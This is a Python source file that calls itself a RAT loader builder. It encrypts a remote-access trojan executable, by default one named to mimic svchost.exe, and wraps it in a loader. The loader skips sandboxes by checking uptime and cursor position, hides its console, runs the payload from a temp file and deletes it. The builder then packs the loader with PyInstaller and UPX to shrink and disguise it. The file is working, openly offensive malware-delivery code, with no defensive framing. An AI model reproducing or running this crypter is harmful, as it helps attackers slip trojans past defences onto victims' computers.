"""
Loader builder for RAT
Creates compact EXE (2-3 MB) with encrypted RAT inside
"""

import os
import sys
import subprocess
import shutil
import random
import string
import zlib
import base64
import time
from pathlib import Path

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def create_python_loader(original_exe_path, output_dir):
    print("Reading original EXE...")
    with open(original_exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"Original size: {len(exe_data) / (1024*1024):.1f} MB")
    
    print("Compressing...")
    compressed = zlib.compress(exe_data, level=9)
    print(f"Compressed size: {len(compressed) / (1024*1024):.1f} MB")
    
    print("Encrypting...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(compressed):
        encrypted.append(byte ^ key[i % len(key)])
    
    data_b64 = base64.b64encode(encrypted).decode('ascii')
    key_b64 = base64.b64encode(key).decode('ascii')
    
    print("Generating loader...")
    loader_code = f'''
import sys
import os
import base64
import zlib
import tempfile
import subprocess
import ctypes
import time
import threading
import random
import string

RAT_DATA = base64.b64decode("{data_b64}")
XOR_KEY = base64.b64decode("{key_b64}")

def xor_decrypt(data, key):
    decrypted = bytearray()
    for i, byte in enumerate(data):
        decrypted.append(byte ^ key[i % len(key)])
    return bytes(decrypted)

def get_temp_path():
    temp_dir = tempfile.gettempdir()
    random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return os.path.join(temp_dir, f"{{random_name}}.exe")

def run_rat():
    try:
        decrypted = xor_decrypt(RAT_DATA, XOR_KEY)
        exe_data = zlib.decompress(decrypted)
        
        temp_path = get_temp_path()
        with open(temp_path, 'wb') as f:
            f.write(exe_data)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        
        proc = subprocess.Popen(
            [temp_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True
        )
        
        def delete_later():
            time.sleep(10)
            try:
                if os.path.exists(temp_path):
                    os.remove(temp_path)
            except:
                pass
        
        threading.Thread(target=delete_later, daemon=True).start()
        return True
        
    except Exception as e:
        try:
            temp_path = get_temp_path()
            with open(temp_path, 'wb') as f:
                f.write(exe_data)
            
            os.startfile(temp_path)
            
            def delete_later():
                time.sleep(15)
                try:
                    if os.path.exists(temp_path):
                        os.remove(temp_path)
                except:
                    pass
            
            threading.Thread(target=delete_later, daemon=True).start()
            return True
        except:
            return False

def check_environment():
    try:
        if ctypes.windll.kernel32.GetTickCount64() < 300000:
            return False
        
        class POINT(ctypes.Structure):
            _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
        
        pt = POINT()
        ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
        if pt.x == 0 and pt.y == 0:
            return False
        
        return True
    except:
        return True

if __name__ == "__main__":
    try:
        if sys.platform == 'win32':
            ctypes.windll.kernel32.FreeConsole()
    except:
        pass
    
    if not check_environment():
        sys.exit(0)
    
    run_rat()
'''
    
    loader_name = f'loader_{generate_random_string()}.py'
    loader_path = os.path.join(output_dir, loader_name)
    with open(loader_path, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print(f"Loader created: {loader_name}")
    return loader_path

def build_loader_with_pyinstaller(loader_path, output_dir):
    output_name = f'loader_{generate_random_string()}'
    
    print("Building EXE with PyInstaller...")
    
    cmd = [
        'pyinstaller',
        '--onefile',
        '--windowed',
        '--name', output_name,
        '--distpath', output_dir,
        '--workpath', os.path.join(output_dir, 'build'),
        '--specpath', output_dir,
        '--hidden-import', 'zlib',
        '--hidden-import', 'base64',
        '--hidden-import', 'threading',
        '--hidden-import', 'ctypes',
        '--hidden-import', 'tempfile',
        '--hidden-import', 'subprocess',
        '--hidden-import', 'random',
        '--hidden-import', 'string',
        '--noconfirm',
        '--clean',
        loader_path
    ]
    
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(f"Build error: {e.stderr}")
        return None
    
    for f in os.listdir(output_dir):
        if f.endswith('.exe') and f.startswith('loader_'):
            return os.path.join(output_dir, f)
    
    return None

def compress_with_upx(exe_path):
    print("Compressing with UPX...")
    try:
        for level in ['--ultra-brute', '--best', '--brute']:
            result = subprocess.run(
                ['upx', level, exe_path],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                print(f"UPX compression successful ({level})")
                return True
        
        subprocess.run(['upx', exe_path], capture_output=True, check=True)
        return True
    except Exception as e:
        print(f"UPX failed: {e}")
        return False

def clean_temp_files(output_dir):
    try:
        for f in os.listdir(output_dir):
            if f.startswith('loader_') and f.endswith('.py'):
                os.remove(os.path.join(output_dir, f))
        
        shutil.rmtree(os.path.join(output_dir, 'build'), ignore_errors=True)
        shutil.rmtree(os.path.join(output_dir, '__pycache__'), ignore_errors=True)
        
        for f in os.listdir(output_dir):
            if f.endswith('.spec'):
                os.remove(os.path.join(output_dir, f))
    except:
        pass

def build_loader(original_exe_path):
    print("=" * 60)
    print("RAT LOADER BUILDER")
    print("=" * 60)
    
    if not os.path.exists(original_exe_path):
        print(f"File not found: {original_exe_path}")
        return None
    
    output_dir = os.path.dirname(original_exe_path)
    
    loader_py = create_python_loader(original_exe_path, output_dir)
    
    loader_exe = build_loader_with_pyinstaller(loader_py, output_dir)
    
    if not loader_exe:
        print("Loader build failed")
        return None
    
    compress_with_upx(loader_exe)
    
    original_size = os.path.getsize(original_exe_path) / (1024 * 1024)
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Path: {loader_exe}")
    print(f"Original size: {original_size:.1f} MB")
    print(f"Loader size: {final_size:.1f} MB")
    print(f"Compression ratio: {final_size/original_size*100:.1f}%")
    print(f"Saved: {original_size - final_size:.1f} MB")
    print("=" * 60)
    
    clean_temp_files(output_dir)
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/svchost.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        print("Usage: python loader_builder.py [path_to_exe]")
        print("Example: python loader_builder.py dist/svchost.exe")
        sys.exit(1)
    
    build_loader(exe_path)
